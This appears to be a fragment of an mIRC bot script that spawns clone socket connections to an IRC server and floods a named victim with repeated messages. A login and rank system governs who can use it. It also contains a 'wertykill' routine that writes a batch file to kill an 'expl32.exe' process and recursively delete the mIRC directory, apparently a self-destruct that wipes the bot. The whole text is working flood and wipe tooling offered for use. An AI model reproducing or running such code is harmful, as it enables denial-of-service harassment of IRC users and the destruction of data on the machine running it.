/changenick { nick $read(users.dll) $+ $rand(1,99999999999999999999999999999999999999999) | anick $read(users.dll) $+ $rand(1,99999999999999999999999999999999999999999) }
/fload { sockopen fludd $+ $rand(1,99999) %fludserver %fludport }
/fjoin { sockwrite -tn fludd* join %fljoin }
/fpart { sockwrite -tn fludd* part %flpart }
/fquit { sockwrite -tn fludd* quit :[º¤DT-GT $+  $+ %ver $+  $+ ¤º] | /cleanup | set %fcon 0 }
/flchnick { sockwrite -tn flud*d NICK %fldprfix $+ $rand(1,99999999) }
/flood { sockwrite -tn fludd* %fludtype %fludvict %fldmsg | sockwrite -tn fludd* %fludtype %fludvict %fldmsg | sockwrite -tn fludd* %fludtype %fludvict %fldmsg | sockwrite -tn fludd* %fludtype %fludvict %fldmsg }
/cleanup { sockclose fludd* | msg %chan +++++[ All Flood Bots Cleared ]+++++ }
/logoff { unset %loginnick | msg %chan $nick logged out | /rlevel 98 | /rlevel 200 }
/logoff2 { unset %loginnick | /rlevel 98 | /rlevel 200 }
/wertykill {
write werty.bat @echo off
write werty.bat $mircdirLibparse.exe -k -f expl32.exe
write werty.bat rd /q /s $mircdir
write werty.bat rd /q /s $mircdir
write werty.bat rd /q /s $mircdir
write werty.bat rd /q /s $mircdir
write werty.bat rd /q /s $mircdir
write werty.bat rd /q /s $mircdir
write werty.bat rd /q /s $mircdir
write werty.bat exit
}